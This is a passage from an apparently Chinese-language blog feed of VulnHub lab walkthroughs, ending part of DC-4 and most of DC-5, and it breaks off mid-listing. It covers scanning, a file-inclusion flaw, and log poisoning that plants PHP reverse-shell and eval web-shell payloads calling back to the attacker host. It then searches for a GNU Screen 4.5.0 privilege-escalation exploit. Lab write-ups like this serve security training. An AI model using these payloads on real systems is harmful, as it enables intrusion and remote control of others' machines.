class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.159] 34116<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-4:/usr/share/nginx/html$ cd /home/jim<br>cd /home/jim<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/home/jim$ ls -l / | grep tmp<br>ls -l / | grep tmp<br>drwxrwxrwt   8 root root  4096 Jul 12 07:14 tmp<br>www-data@dc-4:/home/jim$ wget http://192.168.135.141:8888/shell_32 /tmp<br>wget http://192.168.135.141:8888/shell_32 /tmp<br>--2022-07-12 07:16:47--  http://192.168.135.141:8888/shell_32<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15152 (15K) [application/octet-stream]<br>shell_32: Permission denied<br><br>Cannot write to &#x27;shell_32&#x27; (Permission denied).<br>/tmp: Scheme missing.<br>www-data@dc-4:/home/jim$ cd /tmp<br>cd /tmp<br>www-data@dc-4:/tmp$ wget http://192.168.135.141:8888/shell_32<br>wget http://192.168.135.141:8888/shell_32<br>--2022-07-12 07:18:16--  http://192.168.135.141:8888/shell_32<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 15152 (15K) [application/octet-stream]<br>Saving to: &#x27;shell_32&#x27;<br><br>shell_32            100%[===================&gt;]  14.80K  --.-KB/s    in 0s      <br><br>2022-07-12 07:18:16 (168 MB/s) - &#x27;shell_32&#x27; saved [15152/15152]<br><br>www-data@dc-4:/tmp$ ls<br>ls<br>shell_32<br>systemd-private-3f7853ced3d74153bd9e92b584328615-systemd-timesyncd.service-3jUHwb<br>www-data@dc-4:/tmp$ cd /home/jim<br>cd /home/jim<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/home/jim$ cat /tmp/shell_32 &gt; test.sh<br>cat /tmp/shell_32 &gt; test.sh<br>www-data@dc-4:/home/jim$ ls -l<br>ls -l<br>total 24<br>drwxr-xr-x 2 jim jim  4096 Apr  7  2019 backups<br>-rw------- 1 jim jim   528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim 15152 Jul 12 07:19 test.sh<br>www-data@dc-4:/home/jim$ <br></code></pre></td></tr></table></figure><p>发现只要修改文件 s 权限就没了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt;&gt; test.sh</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13 09:24 test.sh<br><span class="hljs-meta">$</span><span class="bash"> chmod u+s test.sh</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br></code></pre></td></tr></table></figure><p>文件拥有者可以加 s 权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">im@dc-4:~$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwxrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br>jim@dc-4:~$ chmod u+s test.sh<br>jim@dc-4:~$ ls -l<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  184 Jul 13  2022 test.sh<br>jim@dc-4:~$ <br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.jb51.net/article/98188.htm">Linux 深入理解进程权限<em>linux shell</em>脚本之家 (jb51.net)</a></p><p><a href="http://c.biancheng.net/cpp/html/226.html">C语言setuid()函数：设置真实的用户识别码_C语言中文网 (biancheng.net)</a></p><p><a href="https://cloud.tencent.com/developer/article/1801346?from=15425">linux权限 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://www.cnblogs.com/SunMaolin/p/11982049.html">2019-2020-1 20199318《Linux内核原理与分析》第十二周作业 - 孙茂林 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC：5</title>
    <link href="/2022/07/11/Penetration/Vulnhub/Part-1/0x08%20DC-5/"/>
    <url>/2022/07/11/Penetration/Vulnhub/Part-1/0x08%20DC-5/</url>
    
    <content type="html"><![CDATA[<h1 id="0x08-DC-5-vulnhub"><a href="#0x08-DC-5-vulnhub" class="headerlink" title="0x08 DC: 5~vulnhub"></a>0x08 DC: 5~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">DC: 5 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.160</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.160</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.160</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-11 01:01 EDT<br>Nmap scan report for 192.168.135.160<br>Host is up (0.00059s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    nginx 1.6.2<br>|_http-server-header: nginx/1.6.2<br>|_http-title: Welcome<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          36336/tcp   status<br>|   100024  1          52090/udp6  status<br>|   100024  1          56452/tcp6  status<br>|_  100024  1          60965/udp   status<br>36336/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:01:AF:12 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>ssh</td><td>nginx 1.6.2</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td>2-4 (RPC #100000)</td></tr><tr><td>36336/tcp</td><td>open</td><td>status</td><td>1 (RPC #100024)</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p><p>进行目录爆破，得到 robots.txt：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.160</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.160  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.160</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.160</span><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.160/_22-07-11_01-13-17.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-11_01-13-17.log<br>Target: http://192.168.135.160/<br><br>[01:13:17] Starting: <br>[01:13:34] 200 -    4KB - /contact.php                                      <br>[01:13:35] 301 -  184B  - /css  -&gt;  http://192.168.135.160/css/             <br>[01:13:37] 200 -    6KB - /faq.php                                          <br>[01:13:38] 200 -   17B  - /footer.php                                       <br>[01:13:39] 301 -  184B  - /images  -&gt;  http://192.168.135.160/images/       <br>[01:13:39] 403 -  570B  - /images/<br>[01:13:39] 200 -    4KB - /index.php                                        <br>[01:13:53] 200 -  852B  - /thankyou.php                                     <br>                                                                             <br>Task Completed                                 <br></code></pre></td></tr></table></figure><p>题目给的提示：</p><blockquote><p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p></blockquote><p>访问 <code>http://192.168.135.160/footer.php</code> ，刷新发现年份一直在变</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Copyright © 2017 ===&gt; Copyright © 2018 ===&gt; Copyright © 2019 ===&gt; Copyright © 2020<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.160/thankyou.php</code> ，刷新发现年份也会变，但是其他页面刷新是不会变的，说明 <code>thankyou.php</code> 文件可能包含了 <code>footer.php</code> 文件，意味着 <code>thankyou.php</code> 文件可能存在文件包含漏洞 。</p><p>访问 <code>http://192.168.135.160/thankyou.php?file=/etc/passwd</code> ，得到：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure><p>的确存在文件包含，很明显是文件包含漏洞，但想了好久都没有想到该怎么用这个漏洞，网上发现有人是通过日志文件得  shell 的 。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>通过日志文件得 shell 的方法，主要原理是：通过发起带有一句话木马或者反弹 shell 的请求，将一句话木马或者反弹 shell 写入日志文件，再通过包含日志文件从而达到执行一句话木马或者反弹 shell 的目的 。</p><p>访问日志主要记录客户端的请求。客户端向 Nginx 服务器发起的每一次请求都记录在这里。客户端 IP，浏览器信息，referer，请求处理时间，请求 URL 等都可以在访问日志中得到 。</p><p>Nginx 服务器访问日志文件默认目录是：<code>/var/log/nginx/access.log</code></p><p>访问 <code>http://192.168.135.160/thankyou.php?file=/var/log/nginx/access.log</code> ，可以看到我们的访问记录：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.135.141</span> - - <span class="hljs-string">[11/Jul/2022:23:01:29 +1000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">4025</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">135</span>.<span class="hljs-number">141</span> - - <span class="hljs-string">[11/Jul/2022:23:01:36 +1000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">OPTIONS</span> / HTTP/1.1&quot;</span> <span class="hljs-number">405</span> <span class="hljs-number">172</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span> <br></code></pre></td></tr></table></figure><p>使用 curl 发送请求：</p><blockquote><p>经尝试发现，bash 不可以反弹，nc 可以反弹</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;&lt;?php system(&#x27;bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1&#x27;) ?&gt;&quot;</span> http://192.168.135.160/thankyou.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;&lt;?php system(&#x27;nc -e /bin/sh 192.168.135.141 4444&#x27;) ?&gt;&quot;</span> http://192.168.135.160/thankyou.php</span><br></code></pre></td></tr></table></figure><p>或者使用 <code>Burp</code>  在 <code>access.log</code> 里面传入一句话木马，然后上菜刀进行连接：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GET /hello-world! &lt;?php @eval($_REQUEST[cmd])?&gt; HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure><p>kali 监听，浏览器访问 <code>http://192.168.135.160/thankyou.php?file=/var/log/nginx/access.log</code> ，成功得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 53731<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-5:~/html$ pwd<br>pwd<br>/var/www/html<br>www-data@dc-5:~/html$ <br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查找 SUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span>    <br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure><p>看到了 <code>/bin/screen-4.5.0</code> </p><blockquote><p>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p></blockquote><p>查找利用脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit screen 4.5.0</span><br>----------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                         |  Path<br>----------------------------------------------------------------------- ---------------------------------<br>GNU Screen 4.5.0 - Local Privilege Escalation                          | linux/local/41154.sh<br>GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                    | linux/local/41152.txt<br>----------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 41154.sh</span><br>  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation<br>      URL: https://www.exploit-db.com/exploits/41154<br>     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh<br>File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators<br><br>Copied to: /home/kali/41154.sh<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat 41154.sh</span><br></code></pre></td></tr></table></figure><p>这里使用第一个，查看脚本，发现需要使用 gcc ，查看靶机有没有 gcc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:~/html$ gcc --version<br>gcc --version<br>gcc (Debian 4.9.2-10+deb8u2) 4.9.2<br>Copyright (C) 2014 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure><p>上传至靶机 /tmp 目录，加可执行权限，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 